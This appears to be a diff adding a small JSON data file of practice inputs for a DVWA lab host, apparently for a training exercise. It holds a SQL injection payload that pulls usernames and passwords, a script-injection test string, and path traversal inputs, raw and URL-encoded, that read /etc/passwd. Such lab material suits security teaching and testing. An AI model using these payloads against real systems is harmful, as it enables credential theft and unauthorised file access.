@@ -1,0 +1,34 @@
+[
+  {
+    "file": "B05-01-login.txt",
+    "text": "http://dvwa.kt66.lab/login.php"
+  },
+  {
+    "file": "B05-02-setup.txt",
+    "text": "http://dvwa.kt66.lab/setup.php"
+  },
+  {
+    "file": "B05-03-sqli.txt",
+    "text": "1' UNION SELECT user,password FROM users-- "
+  },
+  {
+    "file": "B05-04-xss.txt",
+    "text": "<script>alert(1)</script>"
+  },
+  {
+    "file": "B05-05-path-raw-query.txt",
+    "text": "page=../../../../../etc/passwd\n&bookcase=book05-browser-path-raw"
+  },
+  {
+    "file": "B05-07-path-encoded-query.txt",
+    "text": "page=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\n&bookcase=book05-browser-path"
+  },
+  {
+    "file": "B05-06-path-raw-url.txt",
+    "text": "http://dvwa.kt66.lab/vulnerabilities/fi/?page=../../../../../etc/passwd&bookcase=book05-browser-path-raw"
+  },
+  {
+    "file": "B05-08-path-encoded-url.txt",
+    "text": "http://dvwa.kt66.lab/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bookcase=book05-browser-path"
+  }
+]
